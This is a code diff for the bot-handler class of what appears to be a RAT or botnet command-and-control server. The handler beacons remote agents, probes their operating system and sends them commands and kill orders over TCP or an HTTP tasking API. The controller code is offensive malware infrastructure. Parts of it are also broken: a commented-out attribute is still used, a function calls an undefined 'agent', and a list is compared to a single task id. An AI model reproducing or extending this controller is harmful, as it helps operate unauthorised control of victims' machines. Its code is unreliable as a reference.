@@ -9,27 +9,27 @@ import queue
 import time
 import random
 import base64
+import json
+import requests
 
 import json
 import requests
 
 class Handler(threading.Thread):
 
-    def __init__(self, agent_id, loggers, transport_type, client=None, client_address=None):
+    def __init__(self, agent_id, loggers, transport_type, client_address, client=None):
         threading.Thread.__init__(self)
         self.transport_type = transport_type
 
         if transport_type == "TCP":
-            self.client_address = client_address
             self.client = client
-            self.ip = self.client_address[0]
-            self.port = self.client_address[1]
+
         elif transport_type == "HTTP":
-            self.ip = '127.0.0.1'
-            self.port = 5000
             self.address = "http://127.0.0.1:5000"
 
-
+        self.client_address = client_address
+        self.ip = self.client_address[0]
+        self.port = self.client_address[1]
         self.loggers = loggers
         self.agent_id = agent_id
         self.info = [self.agent_id,self.ip,self.port]
@@ -41,17 +41,27 @@ class Handler(threading.Thread):
                                                         # [0] = PING, [1] = BEACON
 
         # strings used for important communication
-        self.beacon_probe = "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy"
-        self.beacon_reply = "reply code"
-        self.os_win_probe = "UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt"
-        self.os_win_reply = ""
-        self.os_nix_probe = ""
-        self.os_nix_reply = ""
-        self.kill_probe = ""
-        self.kill_reply = ""
-        self.exit_probe = "c2xlZXBpbmc"
-        self.exit_reply = "c2xlZXBpbmc"
+        # self.beacon_probe = "beacon-probe"
+        # self.beacon_reply = "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy"
 
+        self.os_probe = "operating-system-probe"
+        # self.os_win_reply = "d2luZG93cw"
+        # self.os_nix_reply = "bGludXgK"
+
+        # self.kill_probe = "kill"
+        # self.kill_reply = "ZGVhZA"
+
+        # self.exit_probe = "exit"
+        # self.exit_reply = "c2xlZXBpbmc"
+
+        # Dictionary to the above, better
+        self.reply_values = {
+            "beacon"    : "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy",
+            "windows"   : "d2luZG93cw",
+            "linux"     : "bGludXgK",
+            "kill"      : "ZGVhZA",
+            "exit"      : "c2xlZXBpbmc"
+        }
 
     # HTTP helper functions
     def api_get_request(self, endpoint):
@@ -78,9 +88,6 @@ class Handler(threading.Thread):
         # Grab operating system : Linux/Windows
         if(self.transport_type == "TCP"):
             self.setOS()
-            self.loggers[0].q_log('serv','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' operating system set: '+str(self.os))
-            self.loggers[0].q_log('conn','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' operating system set: '+str(self.os))
-
 
         # Beacon indefinitely??
         self.beacon()
@@ -91,9 +98,9 @@ class Handler(threading.Thread):
 #------------------------------------------------------------------------------------------------------------------------------
 
         
-    def setStatus(self, index0, index1):
-        self.status[0] = index0
-        self.status[1] = index1
+    def setStatus(self, ping_status, beacon_status):
+        self.status[0] = ping_status
+        self.status[1] = beacon_status
 
     def stopBeacon(self):
         self.beacon_wait = True
@@ -102,7 +109,20 @@ class Handler(threading.Thread):
         self.beacon_wait = False
 
     def setOS(self):
-        self.os = self.execute("UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt", True)
+        os_code = self.execute(self.os_probe, True)
+        print(os_code)
+        if os_code == self.reply_values["windows"]:
+            self.os = "Windows"
+        elif os_code == self.reply_values["linux"]:
+            self.os = "Linux"
+        else:
+            self.os = "Error"
+            self.loggers[0].q_log('serv','error','[* BotHandler-Msg] Agent '+str(self.agent_id)+': unable to set operating system')
+            self.loggers[0].q_log('conn','error','[* BotHandler-Msg] Agent '+str(self.agent_id)+': unable to set operating system')
+
+        self.loggers[0].q_log('serv','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' operating system set: '+str(self.os))
+        self.loggers[0].q_log('conn','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' operating system set: '+str(self.os))
+
         
     def getOS(self):
         return self.os
@@ -122,6 +142,12 @@ class Handler(threading.Thread):
     def getPort(self):
         return self.port
 
+    def getReply(self, probe):
+        return self.reply_values[probe]
+        
+    def getTT(self):
+        return self.transport_type
+
 #------------------------------------------------------------------------------------------------------------------------------
 
     def kill(self):     # hah
@@ -132,12 +158,22 @@ class Handler(threading.Thread):
         self.loggers[0].q_log('serv','info','[* BotHandler-Msg] Killing connection for agent '+str(self.agent_id))
         self.loggers[0].q_log('conn','info','[* BotHandler-Msg] Killing connection for agent '+str(self.agent_id))
 
-        return_val = self.execute("kill")
+        if self.transport_type == "TCP":
+            return_val = self.execute("kill")
 
-        if "ZGVhZA" in return_val:
-            return_code = True
-        else:
-            return_code = False
+            if self.reply_values["kill"] in return_val:
+                return_code = True
+            else:
+                return_code = False
+                
+        elif self.transport_type == "HTTP":
+            return_val = self.execute(f'[{{"task_type":"configure","running":"false","dwell":"1.0","agent_id":"{str(agent.getID())}"}}]')
+            print(return_val)
+            if "success" in return_val:
+                return_code = True
+            else:
+                return_code = False
+            
 
         self.loggers[0].q_log('serv','info','[* BotHandler-Msg] Sent "kill" command to agent '+str(self.agent_id))
         self.loggers[0].q_log('conn','info','[* BotHandler-Msg] Sent "kill" command to agent '+str(self.agent_id))     
@@ -178,7 +214,7 @@ class Handler(threading.Thread):
                     try:
                         msg = self.execute("beacon", True)
                         
-                        if "d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy" in msg:
+                        if self.reply_values["beacon"] in msg:
                             self.status[1] = "UP"
                             self.loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' - BEACON : UP')
                         else:
@@ -190,16 +226,17 @@ class Handler(threading.Thread):
                         self.loggers[0].q_log('up','info','[* BotHandler-Msg] Agent '+str(self.agent_id)+' - BEACON : ERROR')
 
                 elif(self.transport_type == "HTTP"):
-                    request_payload_string = f'[{{"task_type":"ping","agent_id":{self.agent_id}}}]'
+                    request_payload_string = f'[{{"task_type":"ping","agent_id":"{str(self.agent_id)}"}}]'
                     request_payload = json.loads(request_payload_string)
                     task_obj = self.api_post_request("/tasks", request_payload)
-                    task_id = task_obj["task_id"]
+                    task_id = task_obj[0]["task_id"]
                     wfc = True # waiting for connection
                     t_end = time.time() + 10
                     while(time.time() < t_end and wfc):
                         results = self.api_get_request("/results")
                         for i in range(len(results)):
-                            if(results[i]["agent_id"] == self.agent_id and results[i]["task_id"] == task_id and results[i]["success"] == "true"):
+                            res_task_id = [key for key in results[i].keys() if key != "agent_id" and key != "_id" and key != "result_id"]
+                            if(results[i]["agent_id"] == self.agent_id) and res_task_id == task_id and results[i][res_task_id]["success"] == "true":
                                 wfc = False
                                 self.status[0] = "UP"
                             else:
@@ -353,24 +390,42 @@ class Handler(threading.Thread):
         # Single instance execution
         try:
             # Send data/command to RAT
-            
-            self.client.send(cmd_sent.encode('utf-8'))
+            if self.transport_type == "TCP":
+                self.client.send(cmd_sent.encode('utf-8'))
         except Exception as ex:
-            # Log this
-            print(f"[* BotHandler-Msg:StdExec] Unable to send command to bot {self.agent_id} at {str(self.ip)}")
-            self.loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Unable to execute command on agent '+str(self.agent_id))
-            print(f"[* BotHandler-Msg:StdExec] Error: {ex}")
-            self.loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Error '+str(ex))
+            # Log this - print to screen if not a beacon
+            if cmd_sent != self.beacon_probe:
+                print(f"[* BotHandler-Msg:StdExec] Unable to send command to bot {self.agent_id} at {str(self.ip)}")
+                self.loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Unable to execute command on agent '+str(self.agent_id))
+                print(f"[* BotHandler-Msg:StdExec] Error: {ex}")
+                self.loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Error '+str(ex))
             
             self.beacon_wait = False
-            return "== Return Value Error =="
+            return "Error"
         else:
             cmd_response = ""
+            response = False
             while(True):
                 try:
-                    self.client.settimeout(3)
-                    recv = self.client.recv(4096).decode('utf-8')
-
+                    if self.transport_type == "TCP":
+                        self.client.settimeout(3)
+                        recv = self.client.recv(4096).decode('utf-8')
+                    elif self.transport_type == "HTTP":
+                        recv = "Error"
+                        request_payload = json.loads(cmd_sent)
+                        task_obj = self.api_post_request("/tasks", request_payload)
+                        task_id = task_obj[0]["task_id"]
+                        wfc = True # waiting for connection
+                        t_end = time.time() + 20
+                        while(time.time() < t_end and wfc):
+                            results = self.api_get_request("/results")
+                            for i in reversed(range(len(results))):
+                                res_task_id = [key for key in results[i].keys() if key != "agent_id" and key != "_id" and key != "result_id"] 
+                                if(results[i]["agent_id"] == self.agent_id) and task_id in res_task_id:
+                                    wfc = False
+                                    print(f"[* BotHandler-Msg:StdExec] Command sent to bot {self.agent_id} at {str(self.ip)} has been executed.")
+                                    return(json.dumps(results[i]))
+                        response = True
                 except socket.timeout:
                     # if timeout exception is triggered - assume no more data
                     recv = ""
@@ -384,7 +439,7 @@ class Handler(threading.Thread):
 
                     break
 
-                if not recv:
+                if not recv or response:
                     break
                 else:
                     cmd_response += recv
